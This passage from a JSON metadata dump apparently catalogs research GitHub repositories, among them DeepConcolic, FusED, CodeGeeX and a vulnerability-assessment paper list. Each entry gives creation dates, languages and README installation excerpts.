2.14.1 | Paytm Canada_v2.14.1_apkpure.com | Finance | Google | 100K+ | email | confirmed\n[Thunder VPN][26] | 3.1.12 | Thunder VPN A Fast Unlimited Free VPN Proxy_v3.1.12 | Tool | Google | 10M+ | email | confirmed\n\n[1]: https://github.com/openfoodfacts/openfoodfacts-androidapp\n[2]: https://github.com/erickok/transdroid\n[3]: https://github.com/BelledonneCommunications/linphone-android\n[4]: https://github.com/TeamNewPipe/NewPipe\n[5]: https://github.com/cetoolbox/cetoolbox\n[6]: https://github.com/ka-ba/yucata.envoy\n[7]: https://github.com/AEFeinstein/mtg-familiar\n[8]: https://github.com/OpenTracksApp/OSMDashboard\n[9]: https://github.com/lesspass/lesspass\n[10]: https://github.com/google/android-classyshark\n[11]: https://github.com/nicolasbrailo/VlcFreemote\n[12]: https://github.com/y20k/transistor\n[13]: https://github.com/mkulesh/onpc\n[14]: https://github.com/fenimore/DemocracyDroid\n[15]: https://play.google.com/store/apps/details?id=com.apowersoft.mirror\n[16]: https://play.google.com/store/apps/details?id=com.degoo.android\n[17]: https://play.google.com/store/apps/details?id=deezer.android.app\n[18]: https://play.google.com/store/apps/details?id=com.mediafire.android\n[19]: https://play.google.com/store/apps/details?id=com.fast.free.unblock.secure.vpn\n[20]: https://play.google.com/store/apps/details?id=com.noxgroup.app.security\n[21]: https://play.google.com/store/apps/details?id=media.music.musicplayer&hl=zh_CN\n[22]: https://play.google.com/store/apps/details?id=com.udicorn.proxybrowser.unblockwebsites\n[23]: https://play.google.com/store/apps/details?id=social.android.postegro\n[24]: https://play.google.com/store/apps/details?id=com.gamestar.perfectpiano\n[25]: https://play.google.com/store/apps/details?id=com.one97.hero\n[26]: https://play.google.com/store/apps/details?id=com.fast.free.unblock.thunder.vpn\n\n\n\n",
                    "type": "Text_excerpt",
                    "original_header": "Confirmed or fixed issues (RQ3)",
                    "parent_header": [
                        "OwlEye"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/20200501/OwlEye/master/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2020-07-31T07:52:19Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-05-07T04:43:39Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 21899
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "694": {
        "filename": "InPlusLab_DAppSCAN_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/InPlusLab/DAppSCAN",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": "No installation instructions found.",
        "date_created": [
            {
                "result": {
                    "value": "2023-04-20T16:51:09Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-09-14T12:16:13Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Solidity",
                    "name": "Solidity",
                    "type": "Programming_language",
                    "size": 106172746
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "JavaScript",
                    "name": "JavaScript",
                    "type": "Programming_language",
                    "size": 32154
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "695": {
        "filename": "KTH_CodRep-competition_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/ASSERT-KTH/CodRep",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "E.g.;\n```\n/Users/foo/bar/CodRep-competition/Datasets/Dataset1/Tasks/1.txt 42\n/Users/foo/bar/CodRep-competition/Datasets/Dataset1/Tasks/2.txt 78\n/Users/foo/bar/CodRep-competition/Datasets/Dataset1/Tasks/3.txt 30\n...\n```\n \n",
                    "original_header": "Command-line interface"
                },
                "confidence": 0.9999740990380444,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/KTH/CodRep-competition/master/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "For evaluating specific datasets, use [-d] or [-datasets=] options and specify paths to datasets. The default behaviour is evaluating on all datasets. The path must be absolute path and multiple paths should be separated by `:`, for example:\n```shell\nyour-program Files | python evaluate.py -d /Users/foo/bar/CodRep-competition/Datasets/Dataset1:/Users/foo/bar/CodRep-competition/Datasets/Dataset2\n``` \n",
                    "original_header": "How to evaluate your competing program"
                },
                "confidence": 0.9999550394185479,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/KTH/CodRep-competition/master/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2018-03-23T15:42:25Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2023-12-31T11:51:06Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": "No programming languages found."
    },
    "696": {
        "filename": "castor-software_journey-paper-replication_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/ASSERT-KTH/journey-paper-replication",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": "No installation instructions found.",
        "date_created": [
            {
                "result": {
                    "value": "2018-07-23T16:35:44Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2023-03-24T16:24:22Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "PostScript",
                    "name": "PostScript",
                    "type": "Programming_language",
                    "size": 122833
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "TeX",
                    "name": "TeX",
                    "type": "Programming_language",
                    "size": 109420
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "697": {
        "filename": "TrustAI_DeepConcolic_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/TrustAI/DeepConcolic",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "First of all, please set up a conda environment\n\n```sh\nconda create --name deepconcolic python==3.7\nconda activate deepconcolic\n```\nThis should be followed by installing software dependencies:\n```sh\nconda install opencv nltk matplotlib\nconda install -c pytorch torchvision\npip3 install numpy==1.19.5 scipy==1.4.1 tensorflow\\>=2.4 pomegranate==0.14 scikit-learn scikit-image pulp keract np_utils adversarial-robustness-toolbox parse tabulate pysmt saxpy keras menpo patool z3-solver pyvis\n```",
                    "type": "Text_excerpt",
                    "original_header": "Installation"
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/TrustAI/DeepConcolic/master/README.md"
            },
            {
                "result": {
                    "value": "For long short-term memory models (LSMTs), we design new coverage metrics to consider the internal behaviour of the LSTM layers in processing sequential inputs. We consider not only the tighter metric that quantifies the temporal behaviour (i.e., temporal coverage) but also some looser metrics that quantify either the gate values (i.e., Neuron Coverage and Boundary Coverage) or value change in one step (i.e., Stepwise Coverage).\n\nThe paper is available at https://arxiv.org/pdf/1911.01952.pdf.\n",
                    "type": "Text_excerpt",
                    "original_header": "Tool 2 -- testRNN: Coverage Guided Testing for Recurrent Neural Networks"
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/TrustAI/DeepConcolic/master/README.md"
            },
            {
                "result": {
                    "value": "1. Neuron Coverage (NC),\n2. Boundary Coverage (BC),\n3. Stepwise Coverage (SC),\n4. Temporal Coverage (TC)\n",
                    "type": "Text_excerpt",
                    "original_header": "Four coverage test metrics are applicable:",
                    "parent_header": [
                        "Tool 2 -- testRNN: Coverage Guided Testing for Recurrent Neural Networks"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/TrustAI/DeepConcolic/master/README.md"
            },
            {
                "result": {
                    "value": "1. Fashion-MNIST\n2. Sentiment Analysis,\n3. MNIST Handwritten Digits,\n4. UCF101 (need to download and put into the dataset file)\n\nAs running example, we download the pre-trained Fasion-MNIST model as follows.\n\n```sh\nwget -P saved_models https://cgi.csc.liv.ac.uk/~acps/models/fashion_mnist_lstm.h5\n```\n",
                    "type": "Text_excerpt",
                    "original_header": "A few pre-trained LSTM models:",
                    "parent_header": [
                        "Tool 2 -- testRNN: Coverage Guided Testing for Recurrent Neural Networks"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/TrustAI/DeepConcolic/master/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "DeepConcolic provides means for working with additional datasets, that can be provided via a dedicate plugin system.\nSuch plugins are Python modules that are loaded when the tool starts, and are searched within any directory listed in the colon-separated environment variable `DC_PLUGINS_PATH` if this variable is defined, or else within the `./dc_plugins` directory if it exists (note the latter is relative to the current working directory). \n",
                    "original_header": "Working with Your Own Datasets"
                },
                "confidence": 0.9999991827799519,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/TrustAI/DeepConcolic/master/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "<img src=\"https://github.com/YanghaoZYH/GUAP/blob/master/figs/workflow.png\" width=\"100%\"> \n",
                    "original_header": "Tool 4 -- GUAP: Generalised Universal Adversarial Perturbation"
                },
                "confidence": 0.9797911149790164,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/TrustAI/DeepConcolic/master/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "```sh\npython run_fashion_mnist.py --cuda --gpuid 0 --resume\n``` \n",
                    "original_header": "Generalizing UAP for Fashion_MNIST:"
                },
                "confidence": 0.9959651137386872,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/TrustAI/DeepConcolic/master/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "```sh\npython run_cifar.py --cuda --gpuid 0 --model VGG19 --tau 0.1 --eps 0.03\n``` \n",
                    "original_header": "Generalizing UAP for Cifar10:"
                },
                "confidence": 0.9768358934189602,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/TrustAI/DeepConcolic/master/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "```sh\npython run_imagenet.py --cuda --gpuid 0,1 --model ResNet152 --tau 0.1 --eps 0.03\n```\n \n",
                    "original_header": "Generalizing UAP for ImageNet:"
                },
                "confidence": 0.9768358934189602,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/TrustAI/DeepConcolic/master/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "<img src=\"https://github.com/YanghaoZYH/GUAP/blob/master/figs/Cifar10.png\" width=\"70%\"> \n<img src=\"https://github.com/YanghaoZYH/GUAP/blob/master/figs/ImageNet.png\" width=\"71%\"> \n",
                    "original_header": "Experimental results:"
                },
                "confidence": 0.9939621896472493,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/TrustAI/DeepConcolic/master/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2018-04-30T16:44:20Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-07-01T09:04:54Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 1016197
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Jupyter Notebook",
                    "name": "Jupyter Notebook",
                    "type": "Programming_language",
                    "size": 773054
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "MATLAB",
                    "name": "MATLAB",
                    "type": "Programming_language",
                    "size": 9993
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Makefile",
                    "name": "Makefile",
                    "type": "Programming_language",
                    "size": 803
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Batchfile",
                    "name": "Batchfile",
                    "type": "Programming_language",
                    "size": 799
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 319
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "698": {
        "filename": "lhmtriet_awesome-vulnerability-assessment_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/lhmtriet/awesome-vulnerability-assessment",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "- [Time for addressing software security issues: Prediction models and impacting factors](https://scholar.google.com/scholar?q=Time%20for%20addressing%20software%20security%20issues%3A%20Prediction%20models%20and%20impacting%20factors) (2017)\n",
                    "type": "Text_excerpt",
                    "original_header": "Vulnerability Fixing Effort",
                    "parent_header": [
                        "Awesome Security Vulnerability Assessment",
                        "Task-wise Papers",
                        "Miscellaneous Tasks"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/lhmtriet/awesome-vulnerability-assessment/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "- [Vulnerability exploitation time prediction: an integrated framework for dynamic imbalanced learning](https://scholar.google.com/scholar?q=Vulnerability%20exploitation%20time%20prediction%3A%20an%20integrated%20framework%20for%20dynamic%20imbalanced%20learning) (2022)\n- [VEST: A System for Vulnerability Exploit Scoring & Timing](https://scholar.google.com/scholar?q=VEST%3A%20A%20System%20for%20Vulnerability%20Exploit%20Scoring%20%26%20Timing) (2019)\n- [Using twitter to predict when vulnerabilities will be exploited](https://scholar.google.com/scholar?q=Using%20twitter%20to%20predict%20when%20vulnerabilities%20will%20be%20exploited) (2019)\n- [Exploit prediction scoring system (EPSS)](https://scholar.google.com/scholar?q=Exploit%20prediction%20scoring%20system%20%28EPSS%29) (2019)\n- [Predicting exploit likelihood for cyber vulnerabilities with machine learning](https://scholar.google.com/scholar?q=Predicting%20exploit%20likelihood%20for%20cyber%20vulnerabilities%20with%20machine%20learning) (2015)\n- [Beyond heuristics: learning to classify vulnerabilities and predict exploits](https://scholar.google.com/scholar?q=Beyond%20heuristics%3A%20learning%20to%20classify%20vulnerabilities%20and%20predict%20exploits) (2010) \n",
                    "original_header": "Exploit Time"
                },
                "confidence": 0.9892074368310256,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/lhmtriet/awesome-vulnerability-assessment/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "- [Evaluating Text Augmentation for Boosting the Automatic Mapping of Vulnerability Information to Adversary Techniques](https://scholar.google.com/scholar?q=Evaluating%20Text%20Augmentation%20for%20Boosting%20the%20Automatic%20Mapping%20of%20Vulnerability%20Information%20to%20Adversary%20Techniques) (2022)\n- [Sourcing Language Models and Text Information for Inferring Cyber Threat, Vulnerability and Mitigation Relationships](https://scholar.google.com/scholar?q=Sourcing%20Language%20Models%20and%20Text%20Information%20for%20Inferring%20Cyber%20Threat%2C%20Vulnerability%20and%20Mitigation%20Relationships) (2022)\n- [A Software Security Entity Relationships Prediction Framework Based on Knowledge Graph Embedding Using Sentence-Bert](https://scholar.google.com/scholar?q=A%20Software%20Security%20Entity%20Relationships%20Prediction%20Framework%20Based%20on%20Knowledge%20Graph%20Embedding%20Using%20Sentence-Bert) (2022)\n- [Machine Learning Based Approach for the Automated Mapping of Discovered Vulnerabilities to Adversial Tactics](https://scholar.google.com/scholar?q=Machine%20Learning%20Based%20Approach%20for%20the%20Automated%20Mapping%20of%20Discovered%20Vulnerabilities%20to%20Adversial%20Tactics) (2021)\n- [Key aspects augmentation of vulnerability description based on multiple security databases](https://scholar.google.com/scholar?q=Key%20aspects%20augmentation%20of%20vulnerability%20description%20based%20on%20multiple%20security%20databases) (2021)\n- [Predicting entity relations across different security databases by using graph attention network](https://scholar.google.com/scholar?q=Predicting%20entity%20relations%20across%20different%20security%20databases%20by%20using%20graph%20attention%20network) (2021)\n- [Linking Common Vulnerabilities and Exposures to the MITRE ATT&CK Framework: A Self-Distillation Approach](https://scholar.google.com/scholar?q=Linking%20Common%20Vulnerabilities%20and%20Exposures%20to%20the%20MITRE%20ATT%26CK%20Framework%3A%20A%20Self-Distillation%20Approach) (2021)\n- [Mentions of security vulnerabilities on Reddit, Twitter and GitHub](https://scholar.google.com/scholar?q=Mentions%20of%20security%20vulnerabilities%20on%20Reddit%2C%20Twitter%20and%20GitHub) (2019)\n- [Embedding and Predicting Software Security Entity Relationships: A Knowledge Graph Based Approach](https://scholar.google.com/scholar?q=Embedding%20and%20Predicting%20Software%20Security%20Entity%20Relationships%3A%20A%20Knowledge%20Graph%20Based%20Approach) (2019)\n \n",
                    "original_header": "Cross-source Vulnerability Patterns"
                },
                "confidence": 0.9054851969672789,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/lhmtriet/awesome-vulnerability-assessment/main/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2022-03-04T00:37:49Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-09-27T05:30:19Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": "No programming languages found."
    },
    "699": {
        "filename": "AIasd_FusED_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/AIasd/FusED",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "In `~`,\n```\ngit clone https://github.com/AIasd/openpilot.git\n```\nIn `~/openpilot`,\n```\n./tools/ubuntu_setup.sh\n```\nIn `~/openpilot`, compile Openpilot\n```\nscons -j $(nproc)\n```\n",
                    "type": "Text_excerpt",
                    "original_header": "Install OpenPilot 0.8.5 (customized)",
                    "parent_header": [
                        "FusED",
                        "Getting Started"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/AIasd/FusED/main/README.md"
            },
            {
                "result": {
                    "value": "Make sure the python path is set up correctly through pyenv, in particular, run\n```\nwhich python\n```\nOne should see the following:\n```\n~/.pyenv/shims/python\n```\nOtherwise, one needs to follow the displayed instructions after running\n```\npyenv init\n```\n",
                    "type": "Text_excerpt",
                    "original_header": "Common Python Path Issue",
                    "parent_header": [
                        "FusED",
                        "Getting Started",
                        "Install OpenPilot 0.8.5 (customized)"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/AIasd/FusED/main/README.md"
            },
            {
                "result": {
                    "value": "clang 10 is needed. To install it, run\n```\nsudo apt install clang\n```\n",
                    "type": "Text_excerpt",
                    "original_header": "Common Compilation Issue",
                    "parent_header": [
                        "FusED",
                        "Getting Started",
                        "Install OpenPilot 0.8.5 (customized)"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/AIasd/FusED/main/README.md"
            },
            {
                "result": {
                    "value": "Your environment needs to support opencl 2.0+ in order to run `scons` successfully (when using `clinfo`, it must show something like  \"your OpenCL library only supports OpenCL <2.0+>\")\n\n\n",
                    "type": "Text_excerpt",
                    "original_header": "Common OpenCL Issue",
                    "parent_header": [
                        "FusED",
                        "Getting Started",
                        "Install OpenPilot 0.8.5 (customized)"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/AIasd/FusED/main/README.md"
            },
            {
                "result": {
                    "value": "In `~/Documents/self-driving-cars`,\n```\ncurl -O https://carla-releases.s3.eu-west-3.amazonaws.com/Linux/CARLA_0.9.11_RSS.tar.gz\nmkdir carla_0911_rss\ntar -xvzf CARLA_0.9.11_RSS.tar.gz -C carla_0911_rss\n```\n\nIn `~/Documents/self-driving-cars/carla_0911_rss/PythonAPI/carla/dist`,\n```\neasy_install carla-0.9.11-py3.7-linux-x86_64.egg\n```\n",
                    "type": "Text_excerpt",
                    "original_header": "Install Carla 0.9.11",
                    "parent_header": [
                        "FusED",
                        "Getting Started"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/AIasd/FusED/main/README.md"
            },
            {
                "result": {
                    "value": "In `~/Documents/self-driving-cars/carla_0911_rss`,\n```\ncurl -O https://carla-releases.s3.eu-west-3.amazonaws.com/Linux/AdditionalMaps_0.9.11.tar.gz\nmv AdditionalMaps_0.9.11.tar.gz Import/\n\n```\nand then run\n```\n./ImportAssets.sh\n```\n",
                    "type": "Text_excerpt",
                    "original_header": "Install additional maps",
                    "parent_header": [
                        "FusED",
                        "Getting Started",
                        "Install Carla 0.9.11"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/AIasd/FusED/main/README.md"
            },
            {
                "result": {
                    "value": "In `~/Docuements/self-driving-cars`,\n```\ngit clone https://github.com/FusionFuzz/FusED.git\n```\n\nIn `/Docuements/self-driving-cars/FusED`,\n```\npip3 install -r requirements.txt\n```\n\nInstall pytorch\n```\npip3 install torch==1.9.0+cu111 torchvision==0.10.0+cu111 torchaudio==0.9.0 -f https://download.pytorch.org/whl/torch_stable.html\n```\n\n",
                    "type": "Text_excerpt",
                    "original_header": "Install FusED",
                    "parent_header": [
                        "FusED",
                        "Getting Started"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/AIasd/FusED/main/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2022-04-28T14:06:34Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2023-10-28T10:20:36Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 1078426
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "700": {
        "filename": "michaeldorner_only-time-will-tell_2024-10-04.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/michaeldorner/only-time-will-tell",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "All computations and simulations are packed into a executable Python module that allow testing the code thoroughly and running it quickly via the command line. Only the visualization is a jupyter notebook and not covered by our test setup. \n",
                    "original_header": "Design decisions"
                },
                "confidence": 0.996248111828214,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/michaeldorner/only-time-will-tell/main/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2021-09-15T15:46:02Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2022-05-16T17:27:24Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Jupyter Notebook",
                    "name": "Jupyter Notebook",
                    "type": "Programming_language",
                    "size": 197880
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 17183
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "701": {
        "filename": "THUDM_CodeGeeX_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/THUDM/CodeGeeX",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "Python 3.7+ / CUDA 11+ / PyTorch 1.10+ / DeepSpeed 0.6+ are required. Install ``codegeex`` package via: \n```bash\ngit clone git@github.com:THUDM/CodeGeeX.git\ncd CodeGeeX\npip install -e .\n```\nOr use [CodeGeeX docker](https://hub.docker.com/r/codegeex/codegeex) to quickly set up the environment (with [nvidia-docker](https://docs.nvidia.com/datacenter/cloud-native/container-toolkit/install-guide.html#docker) installed):\n```bash\ndocker pull codegeex/codegeex:latest\n# To enable GPU support, clarify device ids with --device\ndocker run --gpus '\"device=0,1\"' -it --ipc=host --name=codegeex codegeex/codegeex\n```\n",
                    "type": "Text_excerpt",
                    "original_header": "Installation",
                    "parent_header": [
                        "CodeGeeX: A Multilingual Code Generation Model",
                        "Getting Started"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/THUDM/CodeGeeX/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "* **2023-02-14**: CodeGeeX now supports [Cloud Studio](https://cloudstudio.net/), a fantastic web IDE from Tencent. Click on the badge on top of this page to quickly launch an environment to test CodeGeeX. \n* **2022-12-13**: We release the source code of CodeGeeX VS Code extension in [codegeex-vscode-extension](https://github.com/CodeGeeX/codegeex-vscode-extension). Follow [QuickStart](https://github.com/CodeGeeX/codegeex-vscode-extension/blob/main/doc/quickstart.md) to start development. \n* **2022-12-11**: CodeGeeX is now available for Jetbrains IDEs (IntelliJ IDEA, PyCharm, GoLand, CLion, etc), download it [here](https://plugins.jetbrains.com/plugin/20587-codegeex). \n* **2022-12-04**: We release source code of quantization (requires less GPU RAM: 27GB -> 15GB) and model parallelism (possible to run on multiple GPUs with <8G RAM).\n \n* **2022-09-30**: We release the cross-platform source code and models weights for both Ascend and NVIDIA platforms.\n \n",
                    "original_header": "News"
                },
                "confidence": 0.9880532975613462,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/THUDM/CodeGeeX/main/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2022-09-17T14:06:29Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-10-03T00:47:15Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 1372723
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 42133
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "C++",
                    "name": "C++",
                    "type": "Programming_language",
                    "size": 28829
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Java",
                    "name": "Java",
                    "type": "Programming_language",
                    "size": 3700
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Dockerfile",
                    "name": "Dockerfile",
                    "type": "Programming_language",
                    "size": 2872
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "702": {
        "filename": "ibm_D2A_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/IBM/D2A",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": "No installation instructions found.",
        "date_created": [
            {
                "result": {
                    "value": "2021-02-05T20:25:25Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-09-23T09:04:58Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 189688
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 15754
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "703": {
        "filename": "GammaTauAI_opentau_2024-10-04.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/GammaTauAI/opentau",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "Run `make` while being in the directory\n\nThe output binary (symlinked) will be at `/out/client`\n",
                    "type": "Text_excerpt",
                    "original_header": "Installation",
                    "parent_header": [
                        "OpenTau: Using Large Language Models for Gradual Type Inference"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/GammaTauAI/opentau/main/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2022-09-02T05:41:01Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-09-17T00:46:14Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Rust",
                    "name": "Rust",
                    "type": "Programming_language",
                    "size": 138281
                },
                "confidence": 1,
                "technique": "GitHub_API"
